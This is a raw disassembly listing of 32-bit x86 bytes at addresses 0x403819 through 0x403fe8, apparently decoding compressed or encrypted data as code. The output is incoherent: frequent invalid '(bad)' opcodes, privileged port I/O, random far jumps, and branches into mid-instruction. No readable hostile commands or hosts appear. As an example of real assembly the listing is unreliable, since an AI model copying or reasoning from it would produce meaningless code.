  403819:	sbb    bl,BYTE PTR [eax+0x5e7134ca]
  40381f:	das    
  403820:	hlt    
  403821:	js     0x4037f3
  403823:	adc    ecx,DWORD PTR [ecx]
  403825:	pop    ss
  403826:	xor    esp,ebp
  403828:	test   DWORD PTR [ebx+0x60c1b2d0],esi
  40382e:	adc    BYTE PTR [ebx-0x26df239a],ah
  403834:	sub    esi,eax
  403836:	stos   BYTE PTR es:[edi],al
  403837:	fisttp DWORD PTR [edx-0x75ac56c9]
  40383d:	dec    edx
  40383e:	ret    0x5706
  403841:	loopne 0x40383a
  403843:	lds    edi,FWORD PTR [ecx]
  403845:	sahf   
  403846:	mov    ds:0xe8e48cb,eax
  40384b:	xor    al,0xd3
  40384d:	jg     0x403838
  40384f:	scas   al,BYTE PTR es:[edi]
  403850:	jns    0xecf9480b
  403856:	cmp    eax,0xd9678c11
  40385b:	sub    BYTE PTR [eax],ah
  40385d:	loopne 0x403804
  40385f:	sbb    al,0xab
  403861:	dec    esp
  403862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403863:	mov    dl,0x83
  403865:	inc    eax
  403866:	aas    
  403867:	xchg   edx,eax
  403868:	outs   dx,BYTE PTR ds:[esi]
  403869:	mov    ds:0xc5a1e4e0,al
  40386e:	out    dx,eax
  40386f:	xor    eax,0x87298e58
  403874:	loop   0x403824
  403876:	pop    ecx
  403877:	fbstp  TBYTE PTR [eax+0x76]
  40387a:	sbb    al,BYTE PTR [esi+0x2eff635f]
  403880:	out    dx,eax
  403881:	leave  
  403882:	and    ebp,DWORD PTR [esi-0x30]
  403885:	cmc    
  403886:	sti    
  403887:	xor    esp,DWORD PTR [edx]
  403889:	jne    0x403813
  40388b:	xor    BYTE PTR [ebp-0x317709a1],bl
  403891:	push   cs
  403892:	test   DWORD PTR ss:[eax+0x78],esp
  403896:	gs retf 0x5b88
  40389a:	lahf   
  40389b:	adc    bl,BYTE PTR [esi-0x2f]
  40389e:	sbb    eax,0xaa76b756
  4038a3:	cli    
  4038a4:	or     edx,DWORD PTR cs:[esi+edx*2+0x8ac05a5]
  4038ac:	pop    ss
  4038ad:	or     eax,0xbffe2ba9
  4038b2:	pusha  
  4038b3:	(bad)  
  4038b4:	fs or  bl,dh
  4038b7:	outs   dx,BYTE PTR ds:[esi]
  4038b8:	mov    bl,0x99
  4038ba:	iret   
  4038bb:	iret   
  4038bc:	pop    edi
  4038bd:	cs icebp 
  4038bf:	cmp    ecx,DWORD PTR [edx-0x6516f7fc]
  4038c5:	add    al,BYTE PTR [eax]
  4038c7:	add    dh,cl
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0x6d405f3
  4038d5:	and    DWORD PTR [edx+0x12],esp
  4038d8:	adc    al,0x1d
  4038da:	js     0x403954
  4038dc:	(bad)  
  4038dd:	jle    0x403957
  4038df:	js     0x403932
  4038e1:	ja     0x40390b
  4038e3:	popf   
  4038e4:	adc    ebx,DWORD PTR [edx-0x24]
  4038e7:	inc    ebx
  4038e8:	push   cs
  4038e9:	jb     0x4038e2
  4038eb:	lock mov dh,0xf2
  4038ee:	and    al,0x20
  4038f0:	xchg   ecx,eax
  4038f1:	rcl    BYTE PTR [ebx-0x744c1e05],1
  4038f7:	sub    ah,BYTE PTR [ebp-0x236fa1bd]
  4038fd:	mov    ds:0xe0920baa,al
  403902:	stos   DWORD PTR es:[edi],eax
  403903:	cmp    ah,BYTE PTR [ebp-0x4e]
  403906:	in     eax,dx
  403907:	jmp    0x50d477ea
  40390c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40390d:	retf   0x9a6
  403910:	shl    DWORD PTR [edx+0x77],cl
  403913:	mov    DWORD PTR [ecx-0x75],esp
  403916:	sub    al,BYTE PTR [edx-0x42658ec5]
  40391c:	xor    edi,DWORD PTR [eax]
  40391e:	aam    0x55
  403920:	rcl    esp,1
  403922:	pop    esi
  403923:	and    esi,DWORD PTR [esi]
  403925:	jp     0x4038c4
  403927:	mov    ds:0xd9905c10,al
  40392c:	loop   0x403931
  40392e:	bound  eax,QWORD PTR [edx-0x370dc19b]
  403934:	fsub   QWORD PTR [esi-0x258ad93c]
  40393a:	cmp    edx,eax
  40393c:	mov    esi,0x2bcec663
  403941:	mov    al,ds:0xcf957328
  403946:	sbb    dh,BYTE PTR [esp+esi*4+0x68]
  40394a:	loope  0x4039ae
  40394c:	ja     0x403905
  40394e:	es cmc 
  403950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403951:	or     al,0x13
  403953:	enter  0xa922,0x6c
  403957:	aaa    
  403958:	test   al,0x99
  40395a:	push   eax
  40395b:	pop    edx
  40395c:	btc    DWORD PTR [ebx+0x5ce3ffdc],edx
  403963:	add    DWORD PTR [edx],esi
  403965:	sub    bh,cl
  403967:	out    dx,al
  403968:	outs   dx,BYTE PTR ds:[esi]
  403969:	aaa    
  40396a:	mov    ah,0x74
  40396c:	das    
  40396d:	es loope 0x40391b
  403970:	int3   
  403971:	lea    edi,[esi-0x6226e316]
  403977:	mov    edx,0xdf2d51c2
  40397c:	(bad)  
  40397d:	cmp    al,BYTE PTR [edi-0x752ae425]
  403983:	inc    ebx
  403984:	test   ax,0x4e9d
  403988:	loopne 0x40394d
  40398a:	jle    0x403958
  40398c:	fsub   QWORD PTR [esi]
  40398e:	mov    esp,0xf28e809a
  403993:	pop    edi
  403994:	xchg   DWORD PTR [edi+esi*8],ebx
  403997:	fstp   QWORD PTR [ebp*2-0x3397a496]
  40399e:	call   0x9d2:0x3a753dc4
  4039a5:	test   al,0xfe
  4039a7:	imul   esp,ebp,0xffffffd6
  4039aa:	xlat   BYTE PTR ds:[ebx]
  4039ab:	add    dh,BYTE PTR [edx+edx*4]
  4039ae:	sub    bh,0x76
  4039b1:	jg     0x403961
  4039b3:	mov    ah,BYTE PTR [eax+edi*8]
  4039b6:	and    eax,edi
  4039b8:	xchg   DWORD PTR [edx-0x76],esi
  4039bb:	dec    edx
  4039bc:	sub    al,0xb3
  4039be:	test   BYTE PTR [eax+ecx*8-0xf],ah
  4039c2:	mov    gs,WORD PTR [ecx+esi*2]
  4039c5:	adc    dh,BYTE PTR [ebx+0x2b]
  4039c8:	test   eax,0x1c84002d
  4039cd:	pop    esi
  4039ce:	adc    BYTE PTR [eax-0x3f1178b0],0x51
  4039d5:	mov    edx,0x99d39fae
  4039da:	add    dl,BYTE PTR [edi]
  4039dc:	cmc    
  4039dd:	inc    ebx
  4039de:	(bad)  
  4039df:	ins    DWORD PTR es:[edi],dx
  4039e0:	fsub   QWORD PTR [edi+0xb]
  4039e3:	nop
  4039e4:	push   ebp
  4039e5:	adc    ecx,DWORD PTR [esi-0x79d6c6eb]
  4039eb:	jecxz  0x4039e1
  4039ed:	pusha  
  4039ee:	and    BYTE PTR [esi+0x11cc7270],dh
  4039f4:	or     eax,0x18b0a94b
  4039f9:	pop    ecx
  4039fa:	and    dl,BYTE PTR [ecx]
  4039fc:	mov    ebx,0x7c8eb0b5
  403a01:	lahf   
  403a02:	fisttp DWORD PTR [ebx]
  403a04:	lock fdivr DWORD PTR [ebx+0x2d274e05]
  403a0b:	adc    edx,eax
  403a0d:	push   ss
  403a0e:	stc    
  403a0f:	repnz mov dl,bl
  403a12:	jb     0x403a05
  403a14:	mov    DWORD PTR [edi-0x78cbb234],ecx
  403a1a:	dec    esp
  403a1b:	or     cl,bh
  403a1d:	inc    ecx
  403a1e:	mov    eax,ds:0xd8f1c4c1
  403a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a24:	pop    esp
  403a25:	je     0x403a86
  403a27:	ins    BYTE PTR es:[edi],dx
  403a28:	sbb    eax,0x53b228b4
  403a2d:	push   esp
  403a2e:	cmp    al,0xa9
  403a30:	lock in eax,dx
  403a32:	sahf   
  403a33:	outs   dx,BYTE PTR ds:[esi]
  403a34:	add    dh,BYTE PTR [ecx+esi*2+0x6a590190]
  403a3b:	rcl    ah,cl
  403a3d:	pop    edx
  403a3e:	inc    edi
  403a3f:	repz cmp edx,DWORD PTR [ebx+0x2c]
  403a43:	push   ebp
  403a44:	or     dh,BYTE PTR [edx-0x7e4fd8b9]
  403a4a:	pop    eax
  403a4b:	push   0x742c8a95
  403a50:	fucom  st(2)
  403a52:	scas   al,BYTE PTR es:[edi]
  403a53:	pushf  
  403a54:	xor    al,0xfd
  403a56:	jns    0x403a29
  403a58:	push   es
  403a59:	dec    edi
  403a5a:	setno  al
  403a5d:	rol    DWORD PTR [edx+eiz*8-0x26],1
  403a61:	mov    BYTE PTR [ebx],bl
  403a63:	clc    
  403a64:	cs enter 0x6ce5,0xec
  403a69:	lds    esp,FWORD PTR [ebx+esi*2-0x75]
  403a6d:	fisubr WORD PTR [edi-0x9]
  403a70:	cmp    eax,0xd291f32e
  403a75:	pop    esi
  403a76:	lahf   
  403a77:	mov    al,0xaa
  403a79:	js     0x403a75
  403a7b:	cmp    bh,BYTE PTR [ebx-0x767e1a14]
  403a81:	mov    bh,0x18
  403a83:	mov    ds:0x456f1dd1,al
  403a88:	ss popf 
  403a8a:	xchg   esp,eax
  403a8b:	cwde   
  403a8c:	sbb    DWORD PTR [edi-0x5d],ebx
  403a8f:	adc    DWORD PTR [edx-0x3b],ebx
  403a92:	mov    eax,0x79ab1b34
  403a97:	mov    fs,WORD PTR [edx-0x700f2395]
  403a9d:	cmp    cl,dl
  403a9f:	cs mov cl,0x2f
  403aa2:	sub    eax,0xc5084616
  403aa7:	mov    edi,0x20bdb418
  403aac:	lods   eax,DWORD PTR ds:[esi]
  403aad:	in     al,0x8f
  403aaf:	xchg   edx,eax
  403ab0:	adc    ecx,edi
  403ab2:	aaa    
  403ab3:	mov    edi,0x3e0c01cd
  403ab8:	lock mov ds:0x7bb931bb,al
  403abe:	jp     0x403b2a
  403ac0:	xor    DWORD PTR ds:[edx],eax
  403ac3:	ja     0x403ad0
  403ac5:	(bad)  
  403ac6:	fsub   QWORD PTR [esi-0x30]
  403ac9:	enter  0xbd3e,0x1c
  403acd:	pop    ss
  403ace:	xchg   DWORD PTR [eax+esi*8+0x50],esi
  403ad2:	fcom   DWORD PTR [eax+0x2cab988d]
  403ad8:	rcl    BYTE PTR [ebx+0x2f7cadea],cl
  403ade:	pop    ds
  403adf:	add    ah,bh
  403ae1:	sub    esp,eax
  403ae3:	mov    ah,0x7c
  403ae5:	(bad)  
  403ae7:	mov    edi,0xd98ce9c0
  403aec:	shl    DWORD PTR [eax-0x44855fb],0x6c
  403af3:	cdq    
  403af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403af5:	std    
  403af6:	sub    al,BYTE PTR [ebx]
  403af8:	pop    edi
  403af9:	mul    BYTE PTR [edi]
  403afb:	js     0x403a83
  403afd:	cmp    al,0x64
  403aff:	mul    ah
  403b01:	adc    ecx,DWORD PTR [esi+0x3501029e]
  403b07:	out    0x4a,al
  403b09:	in     eax,dx
  403b0a:	sub    bh,bh
  403b0c:	call   0x420b0823
  403b11:	pop    ss
  403b12:	arpl   dx,dx
  403b14:	xchg   edi,eax
  403b15:	push   edx
  403b16:	fadd   DWORD PTR [ebp-0x341c29b6]
  403b1c:	xchg   edx,eax
  403b1d:	fsubr  DWORD PTR [esi]
  403b1f:	dec    esi
  403b20:	and    ebx,DWORD PTR [edx+0x21]
  403b23:	cmp    edx,ebx
  403b25:	repz pop ds
  403b27:	icebp  
  403b28:	pop    ds
  403b29:	ret    
  403b2a:	retf   
  403b2b:	cmp    al,0x6f
  403b2d:	popa   
  403b2e:	(bad)  
  403b2f:	lock sub BYTE PTR [edi],dh
  403b32:	mov    ebx,0x6b63cf2b
  403b37:	adc    BYTE PTR [edx+eax*2+0x24],ch
  403b3b:	ror    DWORD PTR [ecx],0x2d
  403b3e:	js     0x403ac3
  403b40:	pusha  
  403b41:	les    esi,FWORD PTR [eax]
  403b43:	dec    esp
  403b44:	jns    0x403ad7
  403b46:	add    al,0x81
  403b48:	push   esp
  403b49:	cmp    edi,DWORD PTR [ecx+ebp*4]
  403b4c:	cmp    al,0x49
  403b4e:	outs   dx,BYTE PTR ds:[esi]
  403b4f:	arpl   WORD PTR [ecx+0x79b2b5c7],ax
  403b55:	(bad)  
  403b57:	scas   eax,DWORD PTR es:[edi]
  403b58:	xor    al,0xb9
  403b5a:	inc    DWORD PTR [ecx+0x60]
  403b5d:	mov    ebx,0xc0aae9a6
  403b62:	add    al,0x3b
  403b64:	xor    al,0x43
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	xchg   BYTE PTR [eax+0x239a6cd8],cl
  403b85:	js     0x403bff
  403b87:	(bad)  
  403b88:	jle    0x403c02
  403b8a:	js     0x403b4c
  403b8c:	sti    
  403b8d:	aad    0x8c
  403b8f:	icebp  
  403b90:	stos   BYTE PTR es:[edi],al
  403b91:	nop
  403b92:	and    ecx,eax
  403b94:	sbb    BYTE PTR [edx],al
  403b96:	ins    BYTE PTR es:[edi],dx
  403b97:	loopne 0x403b97
  403b99:	add    eax,eax
  403b9b:	(bad)  
  403b9c:	mov    ebp,0x5594b43
  403ba1:	jae    0x403be6
  403ba3:	and    eax,0x5d0e1547
  403ba8:	sbb    DWORD PTR [ebx+0x4f],0xcc6ed3c4
  403baf:	fcmove st,st(0)
  403bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bb2:	fld    TBYTE PTR [ecx-0x55]
  403bb5:	out    dx,eax
  403bb6:	arpl   WORD PTR [edx+ecx*1],bx
  403bb9:	xchg   ebx,eax
  403bba:	scas   al,BYTE PTR es:[edi]
  403bbb:	mov    ebx,0x1210b398
  403bc0:	inc    esi
  403bc1:	xchg   esi,eax
  403bc2:	(bad)  
  403bc3:	adc    DWORD PTR [ebp+0x6fcdd039],eax
  403bc9:	or     BYTE PTR [esi-0x7f],ch
  403bcc:	pop    ebp
  403bcd:	inc    edi
  403bce:	es jno 0x6cac498e
  403bd5:	daa    
  403bd6:	mov    eax,0x87b4cd8a
  403bdb:	mov    edx,0x54b1b7e9
  403be0:	push   ebp
  403be1:	jle    0x403bc7
  403be3:	xor    BYTE PTR [eax+0x5d],ch
  403be6:	lods   eax,DWORD PTR ds:[esi]
  403be7:	dec    ebp
  403be8:	bound  edi,QWORD PTR [ebx]
  403bea:	adc    eax,0x29abeeda
  403bef:	cmp    BYTE PTR [eax],cl
  403bf1:	mov    eax,0xec28f002
  403bf6:	imul   DWORD PTR [eax]
  403bf8:	enter  0xf890,0xff
  403bfc:	jno    0x403bf9
  403bfe:	cdq    
  403bff:	ins    BYTE PTR es:[edi],dx
  403c00:	sbb    eax,0xe599f211
  403c05:	std    
  403c06:	xor    al,0xd6
  403c08:	pop    eax
  403c09:	mov    ch,0xcc
  403c0b:	dec    edx
  403c0c:	push   ds
  403c0d:	dec    eax
  403c0e:	push   cs
  403c0f:	nop
  403c10:	popf   
  403c11:	adc    ch,BYTE PTR [ebp-0x29]
  403c14:	fld    TBYTE PTR [edx-0x471684e3]
  403c1a:	aaa    
  403c1b:	push   edx
  403c1c:	dec    ebp
  403c1d:	or     eax,0x29fbf3ee
  403c22:	mov    ch,0x43
  403c24:	arpl   WORD PTR [eax+0x5f095787],cx
  403c2a:	dec    ebp
  403c2b:	ins    DWORD PTR es:[edi],dx
  403c2c:	call   0x53d5:0x581ea8de
  403c33:	dec    esp
  403c34:	adc    ebp,DWORD PTR [edx-0x23162032]
  403c3a:	cwde   
  403c3b:	scas   eax,DWORD PTR es:[edi]
  403c3c:	addr16 jl 0x403c66
  403c3f:	clc    
  403c40:	pop    ebp
  403c41:	push   0x56cf99c9
  403c46:	or     ah,ah
  403c48:	xor    ebx,DWORD PTR [eax]
  403c4a:	cmp    DWORD PTR [ecx],edx
  403c4c:	iret   
  403c4d:	out    0xce,al
  403c4f:	mov    edi,0xa3aff7e2
  403c54:	mov    eax,0x9ad676b4
  403c59:	ins    DWORD PTR es:[edi],dx
  403c5a:	cmp    BYTE PTR [esi+0x7c26a6fd],al
  403c60:	stc    
  403c61:	cmp    DWORD PTR [edi+eax*8],0x6e06d12e
  403c68:	outs   dx,BYTE PTR ds:[esi]
  403c69:	cwde   
  403c6a:	jne    0x403cbc
  403c6c:	hlt    
  403c6d:	dec    ecx
  403c6e:	outs   dx,DWORD PTR ds:[esi]
  403c6f:	and    al,0xb8
  403c71:	add    ebp,ecx
  403c73:	adc    ecx,0xe728adb7
  403c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c7a:	aam    0x79
  403c7c:	shr    DWORD PTR [ebp-0x50b4de61],1
  403c82:	sahf   
  403c83:	mov    ah,dh
  403c85:	jns    0x403cba
  403c87:	cmp    eax,0x2193baab
  403c8c:	out    dx,eax
  403c8d:	daa    
  403c8e:	or     BYTE PTR [edi-0x7129296a],0x9
  403c95:	fcomp  DWORD PTR [edi+0x18]
  403c98:	enter  0x2ede,0xc1
  403c9c:	ins    DWORD PTR es:[edi],dx
  403c9d:	pop    es
  403c9e:	xchg   ebp,eax
  403c9f:	xchg   ecx,edi
  403ca1:	and    bl,al
  403ca3:	mov    ds:0xb5aa6d2c,eax
  403ca8:	cmp    cl,bl
  403caa:	mov    dl,BYTE PTR [edi-0xd7294b6]
  403cb0:	sahf   
  403cb1:	in     eax,0xeb
  403cb3:	xchg   DWORD PTR [ebp+0x43],edx
  403cb6:	std    
  403cb7:	mov    bl,0x48
  403cb9:	das    
  403cba:	cmp    DWORD PTR [ebp+0x61],esp
  403cbd:	arpl   WORD PTR [edx+0x73383eb],sp
  403cc3:	nop
  403cc4:	dec    edi
  403cc5:	cs inc ebp
  403cc7:	stc    
  403cc8:	sbb    al,0x48
  403cca:	or     eax,0x8d7824f9
  403ccf:	jb     0x403c66
  403cd1:	cmp    ah,BYTE PTR [eax-0x42]
  403cd4:	or     ebp,ecx
  403cd6:	mov    cl,0xb2
  403cd8:	mov    bh,BYTE PTR [ecx-0x35969cd5]
  403cde:	(bad)  
  403cdf:	mov    cl,0xe1
  403ce1:	outs   dx,DWORD PTR ds:[esi]
  403ce2:	stc    
  403ce3:	sar    BYTE PTR [eax+0x346cd412],cl
  403ce9:	sbb    ebx,ebp
  403ceb:	stos   BYTE PTR es:[edi],al
  403cec:	(bad)  
  403cee:	call   0x79da:0x2444b194
  403cf5:	dec    esi
  403cf6:	and    esi,ebp
  403cf8:	xlat   BYTE PTR ds:[ebx]
  403cfa:	les    eax,FWORD PTR [edx+ebp*8-0x63fb5540]
  403d01:	sub    BYTE PTR [edi],dl
  403d03:	popa   
  403d04:	xchg   edx,eax
  403d05:	call   0x8417:0x809c9af8
  403d0c:	add    bh,BYTE PTR [ebp-0x40]
  403d0f:	and    al,0xfb
  403d11:	mov    ch,BYTE PTR [eax]
  403d13:	xor    ebx,DWORD PTR [edi+0x326ea775]
  403d19:	int    0x18
  403d1b:	sub    BYTE PTR [edx-0x3511cf7e],cl
  403d21:	jecxz  0x403cec
  403d23:	mov    al,ds:0xf25dc4e8
  403d28:	in     al,dx
  403d29:	pop    ss
  403d2a:	ret    
  403d2b:	add    dh,ch
  403d2d:	mov    ecx,0xeb8c3c1c
  403d32:	cs push es
  403d34:	and    ecx,0xe7509c8d
  403d3a:	adc    bl,BYTE PTR [eax+0x2ee909cd]
  403d40:	repnz xchg ebp,eax
  403d42:	je     0x403d01
  403d44:	ret    
  403d45:	cwde   
  403d46:	adc    DWORD PTR [ebp+0x6c4a60c9],eax
  403d4c:	inc    ecx
  403d4d:	in     al,dx
  403d4e:	xchg   DWORD PTR [ecx-0x73ab47e6],esi
  403d54:	daa    
  403d55:	cmp    BYTE PTR [edi-0x7d],0x19
  403d59:	iret   
  403d5a:	ss push cs
  403d5c:	and    dl,BYTE PTR ds:0xef428088
  403d62:	retf   0x55eb
  403d65:	lock xchg esi,eax
  403d67:	mov    ch,0x90
  403d69:	mov    eax,0xf6bdbb6
  403d6e:	ret    
  403d6f:	mov    bl,0x8b
  403d71:	xor    al,0xd4
  403d73:	and    BYTE PTR [eax+0x12e161cb],0xa5
  403d7a:	push   edi
  403d7b:	jmp    0xfc0e:0x7a556db5
  403d82:	popa   
  403d83:	xorps  xmm4,XMMWORD PTR es:[edx]
  403d87:	mov    ch,0xdf
  403d89:	mov    dl,0x68
  403d8b:	xor    DWORD PTR [eax],ecx
  403d8d:	jmp    0xb21a:0x7e7a9de3
  403d94:	pop    ebp
  403d95:	ja     0x403d69
  403d97:	fldln2 
  403d99:	pop    esi
  403d9a:	push   ecx
  403d9b:	cld    
  403d9c:	mov    edi,edx
  403d9e:	inc    eax
  403d9f:	mov    ecx,0x3b24ad33
  403da4:	retf   
  403da5:	icebp  
  403da6:	stos   DWORD PTR es:[edi],eax
  403da7:	mov    eax,0x8603060
  403dac:	std    
  403dad:	popf   
  403dae:	arpl   WORD PTR [esp+esi*8-0x3d],bp
  403db2:	push   esi
  403db3:	jp     0x403d40
  403db5:	inc    esp
  403db6:	repnz dec edx
  403db8:	loopne 0x403d61
  403dba:	int    0x4d
  403dbc:	inc    edi
  403dbd:	xor    DWORD PTR [esi],esp
  403dbf:	jp     0x403dbe
  403dc1:	mov    dl,dl
  403dc3:	lds    edi,FWORD PTR [ecx+eax*4+0x47c7b116]
  403dca:	out    0xed,eax
  403dcc:	sub    ebp,DWORD PTR [ecx-0x29]
  403dcf:	lods   al,BYTE PTR ds:[esi]
  403dd0:	dec    eax
  403dd1:	mov    DWORD PTR [edx+esi*8-0x6fdfb8f5],0x3c5d9dfc
  403ddc:	xchg   ecx,eax
  403ddd:	pop    edi
  403dde:	(bad)  
  403ddf:	pop    ss
  403de0:	jmp    0x6c26a24e
  403de5:	dec    ebp
  403de6:	inc    edx
  403de7:	cmp    ah,bl
  403de9:	dec    edi
  403dea:	dec    edi
  403deb:	inc    ebx
  403dec:	push   ebx
  403ded:	out    dx,eax
  403dee:	dec    ebx
  403def:	cwde   
  403df0:	stos   DWORD PTR es:[edi],eax
  403df1:	sbb    ebx,esi
  403df3:	mov    edx,0x796b0f52
  403df8:	pop    eax
  403df9:	dec    esp
  403dfa:	add    ebp,DWORD PTR [edi]
  403dfc:	push   ds
  403dfd:	in     eax,dx
  403dfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dff:	or     DWORD PTR [edx-0x68],0xd82e667b
  403e06:	dec    edx
  403e07:	icebp  
  403e08:	ror    BYTE PTR [edi-0x74bd03e8],cl
  403e0e:	inc    ebp
  403e0f:	or     BYTE PTR [ebx-0x39cc07b3],cl
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0xbbdd8593
  403e30:	pop    ebx
  403e31:	rcl    BYTE PTR ds:0x78782018,0xfe
  403e38:	jle    0x403eb2
  403e3a:	js     0x403de6
  403e3c:	cmp    DWORD PTR [eax+0x0],ebp
  403e3f:	fwait
  403e40:	pop    edi
  403e41:	mov    al,0x68
  403e43:	hlt    
  403e44:	shr    BYTE PTR [esi-0x56],cl
  403e47:	push   esp
  403e48:	jmp    0xcc1f:0xcb0ef961
  403e4f:	(bad)  
  403e50:	gs mov ebp,0x6d5f9aa8
  403e56:	mov    dl,0x89
  403e58:	jmp    0xc1a0:0x32ab4aa7
  403e5f:	push   es
  403e60:	in     eax,dx
  403e61:	cs pop ebp
  403e63:	cwde   
  403e64:	mov    ds:0xf8291d8a,al
  403e69:	and    ebx,ebp
  403e6b:	daa    
  403e6c:	out    0x9a,eax
  403e6e:	dec    ecx
  403e6f:	or     eax,0x3e95453b
  403e74:	sbb    edi,esi
  403e76:	jne    0x403ed2
  403e78:	clc    
  403e79:	test   ch,ch
  403e7b:	fiadd  DWORD PTR [edi+0x6f187c8c]
  403e81:	popa   
  403e82:	xor    al,BYTE PTR [ecx]
  403e84:	xchg   BYTE PTR [esi],al
  403e86:	loope  0x403ea1
  403e88:	test   DWORD PTR [edi-0x56],ebx
  403e8b:	imul   eax,DWORD PTR [esi-0x6c324f8c],0xfffffff9
  403e92:	xchg   esi,eax
  403e93:	pcmpgtd mm4,QWORD PTR [esi]
  403e96:	sbb    al,0x18
  403e98:	pop    es
  403e99:	mov    ebp,0x56a54ced
  403e9e:	sahf   
  403e9f:	pop    edi
  403ea0:	sbb    dh,ah
  403ea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ea3:	jno    0x403e46
  403ea5:	repnz mov ch,0xbd
  403ea8:	pushf  
  403ea9:	mov    BYTE PTR [eax-0x35],0x6f
  403ead:	loope  0x403ec6
  403eaf:	jns    0x403ec1
  403eb1:	sub    BYTE PTR [esi+0x2fce336c],al
  403eb7:	push   cs
  403eb8:	clc    
  403eb9:	or     eax,0x11934fb
  403ebe:	aam    0x11
  403ec0:	push   DWORD PTR [esi+0xd7e061f]
  403ec6:	inc    ecx
  403ec7:	add    ecx,esp
  403ec9:	jecxz  0x403e8b
  403ecb:	xor    bl,BYTE PTR [ecx+0x430bc0d3]
  403ed1:	dec    ebx
  403ed2:	mov    esp,0xa58eccca
  403ed7:	cdq    
  403ed8:	test   BYTE PTR [edi+0x34],dh
  403edb:	outs   dx,BYTE PTR ds:[esi]
  403edc:	and    eax,DWORD PTR [edx-0x383fae0f]
  403ee2:	jno    0x403f3a
  403ee4:	or     DWORD PTR [ebx-0x5c],edi
  403ee7:	mov    ebx,0x6004baf
  403eec:	mov    ecx,0x36e9e1e8
  403ef1:	test   DWORD PTR [esi+0x2d8ebb24],edx
  403ef7:	jns    0x403f15
  403ef9:	inc    BYTE PTR [edi+0x23]
  403efc:	sub    eax,0x35d992e4
  403f01:	sbb    eax,0x751a2d23
  403f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f07:	xchg   esp,eax
  403f08:	out    0x85,al
  403f0a:	loopne 0x403ebd
  403f0c:	scas   eax,DWORD PTR es:[edi]
  403f0d:	dec    ebp
  403f0e:	and    eax,0x1f6b018a
  403f13:	dec    ebp
  403f14:	jne    0x403f80
  403f16:	pop    ds
  403f17:	sub    esi,DWORD PTR [ebx]
  403f19:	xchg   esp,eax
  403f1a:	shl    DWORD PTR [ecx+0x1b1dabb8],cl
  403f20:	aaa    
  403f21:	or     al,0x57
  403f23:	out    dx,eax
  403f24:	scas   al,BYTE PTR es:[edi]
  403f25:	sbb    ebp,DWORD PTR [ebx+0x606166cc]
  403f2b:	pop    ebx
  403f2c:	leave  
  403f2d:	jb     0x403fa4
  403f2f:	cwde   
  403f30:	iret   
  403f31:	in     al,0x72
  403f33:	cmp    eax,0xae0c3deb
  403f38:	sahf   
  403f39:	mov    al,ds:0x66512e51
  403f3e:	imul   ebx,DWORD PTR [ebx+0x41],0x39d3b568
  403f45:	cmp    eax,0xb58efe5d
  403f4a:	das    
  403f4b:	or     edx,edi
  403f4d:	(bad)  
  403f4e:	out    0xd2,al
  403f50:	imul   esp,eax,0x1ad4ccae
  403f56:	sar    edi,1
  403f58:	xchg   edi,eax
  403f59:	add    DWORD PTR [edx+0x5b15dd0],0x92ab6fad
  403f63:	repnz imul edi,DWORD PTR [eax],0x1aa6f52b
  403f6a:	cmp    eax,0xac787e32
  403f6f:	xchg   DWORD PTR [ebx],esp
  403f71:	push   edx
  403f72:	pop    ecx
  403f73:	mov    eax,0x5614884b
  403f78:	out    0xc9,eax
  403f7a:	inc    DWORD PTR [ecx-0x356a9c0c]
  403f80:	stos   DWORD PTR es:[edi],eax
  403f81:	inc    esp
  403f82:	popa   
  403f83:	das    
  403f84:	inc    esi
  403f85:	fld    st(4)
  403f87:	push   0x1e
  403f89:	dec    esp
  403f8a:	push   ebp
  403f8b:	xor    al,0xdb
  403f8d:	mov    ds:0x5abc4654,al
  403f92:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f94:	cld    
  403f95:	ret    0x86c4
  403f98:	int3   
  403f99:	and    BYTE PTR [eax],0xd2
  403f9c:	jecxz  0x403fa5
  403f9e:	push   esp
  403f9f:	xchg   ecx,eax
  403fa0:	or     BYTE PTR [ebp-0x4e],0x69
  403fa4:	jg     0x403f2d
  403fa6:	loop   0x403fc0
  403fa8:	or     eax,0x314755ef
  403fad:	cli    
  403fae:	in     eax,0xbe
  403fb0:	out    dx,al
  403fb1:	not    DWORD PTR [ecx+0x7f]
  403fb4:	push   0xb809fc7d
  403fb9:	xchg   ecx,eax
  403fba:	lods   eax,DWORD PTR ds:[esi]
  403fbb:	fadd   DWORD PTR [ecx]
  403fbd:	jmp    0x403f5d
  403fbf:	outs   dx,BYTE PTR ds:[esi]
  403fc0:	cli    
  403fc1:	and    BYTE PTR [eax],ah
  403fc3:	popa   
  403fc4:	cmp    al,0x96
  403fc6:	push   es
  403fc7:	out    0xac,eax
  403fc9:	cdq    
  403fca:	inc    esi
  403fcb:	scas   al,BYTE PTR es:[edi]
  403fcc:	jb     0x403fbf
  403fce:	or     al,0xba
  403fd0:	test   BYTE PTR [ecx-0x2c],cl
  403fd3:	pop    esi
  403fd4:	dec    esi
  403fd5:	fnstenv ss:[eax+edx*1-0x18]
  403fda:	fdiv   QWORD PTR [esi+0x12]
  403fdd:	sub    BYTE PTR [esi],0xe3
  403fe0:	cmp    BYTE PTR [ebx-0x32],dl
  403fe3:	jno    0x40401c
  403fe5:	sub    BYTE PTR [ebp-0x7],bh
  403fe8:	pushf  
